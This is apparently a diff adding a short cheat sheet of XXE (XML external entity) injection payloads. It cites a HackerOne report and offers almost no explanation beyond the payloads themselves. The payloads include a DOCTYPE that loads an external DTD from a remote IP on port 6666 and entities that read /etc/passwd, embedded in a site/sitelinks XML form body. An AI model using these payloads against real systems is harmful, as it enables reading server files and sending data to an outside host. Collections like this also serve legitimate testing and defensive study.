@@ -1,0 +1,33 @@
+For XXE/xml Injection
+
+for better details visit :- https://hackerone.com/reports/12583
+
+
+<!DOCTYPE aaa SYSTEM "http://95.211.198.76:6666/xxe.xml"> <site><name><![CDATA[fulltitle'"><a>asdF</A>]]></name><sitelinks>
+<sitelink title="title" url="http://simple-semiconductors.com/asdfasdf" />
+</sitelinks><addresses><address><addressLocality>city%26foo%3b</addressLocality><addressCountry>country </addressCountry>
+<addressRegion>region</addressRegion><streetAddress>addr</streetAddress></address></addresses></site>&id=481265&site_url=simple-semiconductors.com///////////////////////////////////////////////////&
+sitemap_url_errors=-1
+
+payload:
+<!DOCTYPE aaa SYSTEM "http://95.211.198.76:6666/xxe.xml"> 
+
+
+payload:
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY foo SYSTEM "file:///etc/passwd" >]> <site><name><![CDATA[fulltitle'"><a>asdF</A>]]>
+</name><sitelinks><sitelink title="title" url="http://simple-semiconductors.com/asdfasdf" /></sitelinks><addresses><address>
+<addressLocality>%26foo%3b</addressLocality><addressCountry>country </addressCountry><addressRegion>region</addressRegion>
+<streetAddress>addr</streetAddress></address></addresses></site>
+
+
+payload:
+&sitelinks_xml=
+<!DOCTYPE site [<!ELEMENT foo ANY ><!ENTITY foo SYSTEM "/etc/passwd" > ]> <site>
+<name><![CDATA[fulltitle'"><a>asdF</A>]]></name><sitelinks><sitelink title="title" url="http://simple-semiconductors.com/asdfasdf" >%26foo%3b</sitelink>
+</sitelinks><addresses><address><addressLocality>x</addressLocality><addressCountry>country </addressCountry><addressRegion>region</addressRegion>
+<streetAddress>addr</streetAddress></address></addresses></site>
+
+
+
+
+
